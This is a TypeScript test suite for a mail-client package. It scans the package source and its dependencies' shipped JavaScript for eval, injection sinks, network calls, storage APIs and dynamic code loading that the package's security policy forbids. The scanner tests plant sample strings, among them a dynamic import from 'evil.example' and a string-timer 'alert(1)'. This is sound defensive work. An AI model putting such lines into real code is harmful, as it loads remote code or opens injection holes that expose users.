// Runtime constraints (contracts/mail-client-v1.md, rules 1 to 3): under the dashboard's policy
// (nonce + 'strict-dynamic', Trusted Types enforced, no 'unsafe-eval', connect-src 'self') with no
// network, and nothing persisted but a kept device. Checked on src/ and on the JavaScript every
// runtime dependency actually ships (read from node_modules, not from a README), the way
// mail-crypto's test does. The one DOM sink this package may touch is the frame's srcdoc, in
// src/render.ts, through the Trusted Types policy; DOMPurify parses into a detached document and is
// allowed its sinks. Rule 3 as amended by spec 002: the one storage API is IndexedDB, in
// src/device-store.ts alone (the kept-device store, K5); no other module may name it, and no module,
// that one included, may use localStorage, sessionStorage, the Cache API, Web SQL or cookies.
import { existsSync, readdirSync, readFileSync } from "node:fs";
import { createRequire } from "node:module";
import { dirname, join, relative, resolve, sep } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, test } from "vitest";

const packageDir = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const srcDir = join(packageDir, "src");
const ownManifest = JSON.parse(readFileSync(join(packageDir, "package.json"), "utf8"));

interface Rule {
  name: string;
  pattern: RegExp;
}

const CSP_RULES: Rule[] = [
  { name: "eval", pattern: /\beval\s*\(/ },
  { name: "Function constructor", pattern: /\bnew\s+Function\s*\(|(?<![\w$.])Function\s*\(/ },
  { name: "string timer (eval)", pattern: /\bset(?:Timeout|Interval|Immediate)\s*\(\s*["'`]/ },
  { name: "WebAssembly", pattern: /\bWebAssembly\b/ },
  {
    name: "DOM or injection sink",
    pattern: /\b(?:innerHTML|outerHTML|insertAdjacentHTML|srcdoc|createContextualFragment|DOMParser|document\.write|execScript)\b|javascript:/,
  },
  {
    name: "network",
    pattern: /\bfetch\s*\(|\b(?:XMLHttpRequest|WebSocket|EventSource|WebTransport|RTCPeerConnection|sendBeacon|importScripts)\b|\bnew\s+(?:Shared)?Worker\s*\(/,
  },
  {
    name: "persistence",
    pattern: /\b(?:localStorage|sessionStorage|indexedDB|openDatabase|document\.cookie)\b|\bcaches\s*\./,
  },
  {
    name: "dynamic code loading",
    pattern: /\bimport\s*\(|\brequire\s*\(\s*\[|\brequire\s*\(\s*["'](?!\.{1,2}\/)/,
  },
];

/** Node-only APIs that would stop the source from running in a browser. */
const PORTABILITY_RULES: Rule[] = [
  { name: "node: import", pattern: /["']node:/ },
  { name: "Buffer", pattern: /\bBuffer\b/ },
  { name: "process", pattern: /\bprocess\s*\./ },
  { name: "require", pattern: /\brequire\s*\(/ },
];

interface Allowance {
  file: RegExp;
  rule: string;
  line: RegExp;
  reason: string;
}

/** Every accepted finding is listed here with its reason. A stale entry fails the test too. */
const ALLOWED: Allowance[] = [
  {
    file: /^src\/render\.ts$/,
    rule: "DOM or injection sink",
    line: /\.srcdoc\s*=|\bsrcdoc\b/,
    reason: "the one sink the contract allows: the frame's srcdoc, assigned a TrustedHTML from the package's policy (spec D3)",
  },
  {
    file: /^src\/render\.ts$/,
    rule: "DOM or injection sink",
    line: /element\.outerHTML/,
    reason: "a READ of outerHTML: serialising the sanitised, detached document DOMPurify returned; no markup is written",
  },
  {
    file: /^src\/device-store\.ts$/,
    rule: "persistence",
    line: /^const idb = \(globalThis as \{ indexedDB\?: IDBFactory \}\)\.indexedDB;$/,
    reason:
      "rule 3 as amended by spec 002 (K5): the kept-device store reads the global indexedDB, once, and is the only " +
      "module that may; every write is checked against K5 there",
  },
  {
    file: /^dompurify\//,
    rule: "DOM or injection sink",
    line: /./,
    reason:
      "DOMPurify is the sanitiser: it parses with DOMParser into a detached document, reads innerHTML/outerHTML to " +
      "serialise, and names javascript: in the patterns it strips. Under Trusted Types enforcement its own innerHTML " +
      "fallback only runs with the policy this package hands it (TRUSTED_TYPES_POLICY).",
  },
];

interface Finding {
  file: string;
  line: number;
  rule: string;
  text: string;
}

function scan(file: string, text: string, rules: Rule[]): Finding[] {
  const findings: Finding[] = [];
  text.split("\n").forEach((line, i) => {
    for (const rule of rules) {
      if (rule.pattern.test(line)) findings.push({ file, line: i + 1, rule: rule.name, text: line.trim().slice(0, 160) });
    }
  });
  return findings;
}

function filesUnder(dir: string, extensions: RegExp): string[] {
  const out: string[] = [];
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const path = join(dir, entry.name);
    if (entry.isDirectory()) {
      if (entry.name !== "node_modules") out.push(...filesUnder(path, extensions));
    } else if (extensions.test(entry.name)) {
      out.push(path);
    }
  }
  return out;
}

/** The directory of a package as Node resolves it from `fromDir`, whether or not its exports map exposes package.json. */
function packageDirOf(fromDir: string, name: string): string {
  const require = createRequire(join(fromDir, "package.json"));
  try {
    return dirname(require.resolve(`${name}/package.json`));
  } catch {
    let dir = dirname(require.resolve(name));
    while (!existsSync(join(dir, "package.json")) || JSON.parse(readFileSync(join(dir, "package.json"), "utf8")).name !== name) {
      const parent = dirname(dir);
      if (parent === dir) throw new Error(`cannot find the package directory of ${name}`);
      dir = parent;
    }
    return dir;
  }
}

/** The runtime dependency closure, resolved the way Node resolves it from this package. */
function runtimeDependencies(): Map<string, string> {
  const found = new Map<string, string>();
  const visit = (fromDir: string, name: string) => {
    if (found.has(name)) return;
    const dir = packageDirOf(fromDir, name);
    const manifestPath = join(dir, "package.json");
    found.set(name, dir);
    const manifest = JSON.parse(readFileSync(manifestPath, "utf8"));
    for (const dep of Object.keys(manifest.dependencies ?? {})) visit(dir, dep);
    for (const dep of Object.keys(manifest.optionalDependencies ?? {})) visit(dir, dep);
  };
  for (const dep of Object.keys(ownManifest.dependencies ?? {})) visit(packageDir, dep);
  return found;
}

function unexplained(findings: Finding[], used: Set<Allowance>): Finding[] {
  return findings.filter((f) => {
    const allowance = ALLOWED.find((a) => a.rule === f.rule && a.file.test(f.file.split(sep).join("/")) && a.line.test(f.text));
    if (allowance) used.add(allowance);
    return !allowance;
  });
}

describe("CSP: the scanner itself", () => {
  test("flags each forbidden construct", () => {
    const planted = [
      'eval("1")',
      'const f = new Function("return 1")',
      'setTimeout("alert(1)", 0)',
      "WebAssembly.instantiate(bytes)",
      "el.innerHTML = html",
      "frame.srcdoc = html",
      'fetch("/x")',
      "new XMLHttpRequest()",
      'localStorage.setItem("k", v)',
      "indexedDB.open('x')",
      'import("https://evil.example/x.js")',
      'require("crypto")',
    ];
    for (const line of planted) expect(scan("planted.js", line, CSP_RULES), line).not.toEqual([]);
    expect(scan("fine.js", 'import { x } from "./y.js"; setTimeout(() => lock(), ms); const req = require("./z.js");', CSP_RULES)).toEqual([]);
  });

  test("the IndexedDB allowance covers the device store's one line and nothing else", () => {
    const allowed = (file: string, line: string) => unexplained(scan(file, line, CSP_RULES), new Set()).length === 0;
    expect(allowed("src/device-store.ts", "const idb = (globalThis as { indexedDB?: IDBFactory }).indexedDB;")).toBe(true);
    // The same line anywhere else, any other use in the store, and every other storage API in the store: flagged.
    expect(allowed("src/session.ts", "const idb = (globalThis as { indexedDB?: IDBFactory }).indexedDB;")).toBe(false);
    for (const line of ["indexedDB.open('x')", "localStorage.setItem('k', v)", "sessionStorage.getItem('k')", "caches.open('x')", "document.cookie = 'a=b'", "openDatabase('x')"]) {
      expect(allowed("src/device-store.ts", line), line).toBe(false);
    }
  });
});

describe("CSP: no eval, Function, string timers, WebAssembly, network, persistence or DOM sinks", () => {
  test("in the package source, except the frame's srcdoc in src/render.ts", () => {
    const files = filesUnder(srcDir, /\.ts$/);
    expect(files.length).toBeGreaterThanOrEqual(8);
    const used = new Set<Allowance>();
    const findings = files.flatMap((f) => scan(relative(packageDir, f), readFileSync(f, "utf8"), CSP_RULES));
    expect(unexplained(findings, used)).toEqual([]);
    // Every allowance for src/ is used: render.ts assigns srcdoc through the policy and reads
    // outerHTML; device-store.ts reads the global indexedDB.
    expect([...used].map((a) => a.reason).sort()).toEqual(ALLOWED.filter((a) => a.file.test("src/render.ts") || a.file.test("src/device-store.ts")).map((a) => a.reason).sort());
    expect(findings.filter((f) => f.rule === "persistence").map((f) => f.file)).toEqual(["src/device-store.ts"]);
  });

  test("in every runtime dependency's shipped JavaScript", () => {
    const deps = runtimeDependencies();
    // @types/trusted-types is DOMPurify's optional, types-only dependency: it ships no JavaScript.
    expect([...deps.keys()].sort()).toEqual(["@hpke/common", "@hpke/core", "@proprietor/mail-crypto", "@types/trusted-types", "dompurify", "postal-mime"]);
    const used = new Set<Allowance>();
    const findings: Finding[] = [];
    for (const [name, dir] of deps) {
      if (name.startsWith("@hpke/") || name === "@proprietor/mail-crypto") continue; // mail-crypto's own test scans these
      if (name.startsWith("@types/")) {
        expect(filesUnder(dir, /\.(?:m|c)?js$/), `${name} ships no JavaScript`).toEqual([]);
        continue;
      }
      const files = filesUnder(dir, /\.(?:m|c)?js$/).filter((f) => !/\.map$|\.cov\./.test(f));
      expect(files.length, name).toBeGreaterThan(0);
      for (const file of files) {
        findings.push(...scan(join(name, relative(dir, file)), readFileSync(file, "utf8"), CSP_RULES));
      }
    }
    expect(unexplained(findings, used)).toEqual([]);
    expect(ALLOWED.filter((a) => !used.has(a) && !a.file.test("src/render.ts") && !a.file.test("src/device-store.ts")).map((a) => a.reason)).toEqual([]); // no stale allowances
  });

  test("dependencies are pinned to exact versions", () => {
    for (const [name, version] of Object.entries({ ...ownManifest.dependencies, ...ownManifest.devDependencies } as Record<string, string>)) {
      expect(version, name).toMatch(/^\d+\.\d+\.\d+$/);
    }
  });
});

describe("portability: the source runs in browsers unchanged", () => {
  test("no Node-only API", () => {
    const findings = filesUnder(srcDir, /\.ts$/).flatMap((f) => scan(relative(packageDir, f), readFileSync(f, "utf8"), PORTABILITY_RULES));
    expect(findings).toEqual([]);
  });

  test("imports are relative files in src/ or declared dependencies, extensionless", () => {
    const declared = new Set(Object.keys(ownManifest.dependencies ?? {}));
    for (const file of filesUnder(srcDir, /\.ts$/)) {
      const text = readFileSync(file, "utf8");
      for (const [, specifier] of text.matchAll(/\bfrom\s+["']([^"']+)["']/g)) {
        if (specifier!.startsWith(".")) {
          const target = resolve(dirname(file), specifier!);
          expect(target.startsWith(srcDir + sep), `${file}: ${specifier}`).toBe(true);
          expect(specifier, `${file}: extensionless`).not.toMatch(/\.[cm]?[jt]s$/);
        } else {
          expect(declared.has(specifier!), `${file} imports undeclared ${specifier}`).toBe(true);
        }
      }
    }
  });
});
